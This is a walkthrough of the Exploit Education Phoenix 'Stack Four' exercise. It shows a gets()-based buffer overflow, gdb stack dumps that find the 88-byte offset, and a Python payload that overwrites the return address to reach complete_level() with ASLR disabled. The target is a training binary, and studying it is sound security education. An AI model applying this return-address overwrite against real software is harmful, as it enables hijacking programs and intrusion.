The vulnerable snippet of code :

```C
void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}
```

The goal here is to exploit the buffer overflow to rewrite the builtin return address with a pointer to the complete_level() function.

The builtin return address is one of the first things stored on the stack, right before the ebp. Let's try out payloads in gdb to find out how many bytes we need to overwrite in order to modify the return address.

# GDB

First let's launch the program and use a breakpoint after the vulnerable gets() call, so we can look at the stack and see what's going on :

```bash
(gdb) r <<< $(python3 -c 'print("A"*4)')
The program being debugged has been started already.
Starting program: /home/coucou/Documents/Exploit_Education/Phoenix/04_Stack_Four/code <<< $(python3 -c 'print("A"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to Stack Four, brought to you by https://exploit.education

Breakpoint 1, 0x000055555555519a in start_level ()
(gdb) x/30xw $rsp
0x7fffffffd9d0:	0x41414141	0x00000000	0x55556060	0x00005555
0x7fffffffd9e0:	0xf7f9d780	0x00007fff	0xf7e3ecfa	0x00007fff
0x7fffffffd9f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffda00:	0xffffdb58	0x00007fff	0xffffda40	0x00007fff
0x7fffffffda10:	0x00000000	0x00000000	0xffffdb68	0x00007fff
0x7fffffffda20:	0xffffda40	0x00007fff	0x555551e8	0x00005555
0x7fffffffda30:	0xffffdb58	0x00007fff	0x00000000	0x00000001
0x7fffffffda40:	0x00000001	0x00000000
(gdb) i r
rax            0x7fffffffd9d0      140737488345552
rbx            0x7fffffffdb58      140737488345944
rcx            0x7ffff7f9caa0      140737353730720
rdx            0x0                 0
rsi            0x4141              16705
rdi            0x7ffff7f9ea40      140737353738816
rbp            0x7fffffffda20      0x7fffffffda20
rsp            0x7fffffffd9d0      0x7fffffffd9d0
r8             0x5555555596b5      93824992253621
r9             0x0                 0
r10            0x1000              4096
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdb68      140737488345960
r14            0x555555557dd8      93824992247256
r15            0x7ffff7ffd000      140737354125312
rip            0x55555555519a      0x55555555519a <start_level+20>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) c
Continuing.
and will be returning to 0x5555555551e8
[Inferior 1 (process 14125) exited normally]
```

We can see that the rbp is stored at 0x7fffffffda20 at that the following entry in the stack is indeed the address where the program is returning.

Now let's overwrite all the memory stored over the return address :

```bash
(gdb) r <<< $(python3 -c 'print("A"*88)')
Starting program: /home/coucou/Documents/Exploit_Education/Phoenix/04_Stack_Four/code <<< $(python3 -c 'print("A"*88)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to Stack Four, brought to you by https://exploit.education

Breakpoint 1, 0x000055555555519a in start_level ()
(gdb) x/30xw $rsp
0x7fffffffd9d0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9e0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9f0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda10:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda20:	0x41414141	0x41414141	0x55555100	0x00005555
0x7fffffffda30:	0xffffdb58	0x00007fff	0x00000000	0x00000001
0x7fffffffda40:	0x00000001	0x00000000
(gdb) c
Continuing.
and will be returning to 0x555555555100

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffdb58 in ?? ()
```

Finally let's write the pointer to the function complete_level() over the return address :

```bash
(gdb) r <<< $(python3 -c 'print("\x41"*88+"\x69\x51"+"\x55"*4)')
Starting program: /home/coucou/Documents/Exploit_Education/Phoenix/04_Stack_Four/code <<< $(python3 -c 'print("\x41"*88+"\x69\x51"+"\x55"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to Stack Four, brought to you by https://exploit.education

Breakpoint 1, 0x000055555555519a in start_level ()
(gdb) x/30xw $rsp
0x7fffffffd9d0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9e0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9f0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda10:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda20:	0x41414141	0x41414141	0x55555169	0x00005555
0x7fffffffda30:	0xffffdb58	0x00007fff	0x00000000	0x00000001
0x7fffffffda40:	0x00000001	0x00000000
(gdb) c
Continuing.
and will be returning to 0x555555555169
Congratulations, you've finished Stack Four :-) Well done!
[Inferior 1 (process 14187) exited normally]
```

The payload is working.

# Exploit

Let's run it on a terminal without ASLR :

```bash
$ setarch "$(uname -m)" -R /bin/bash

$ python3 -c 'print("\x41"*88+"\x69\x51"+"\x55"*4)' | ./code 
Welcome to Stack Four, brought to you by https://exploit.education
and will be returning to 0x555555555169
Congratulations, you've finished Stack Four :-) Well done!
```
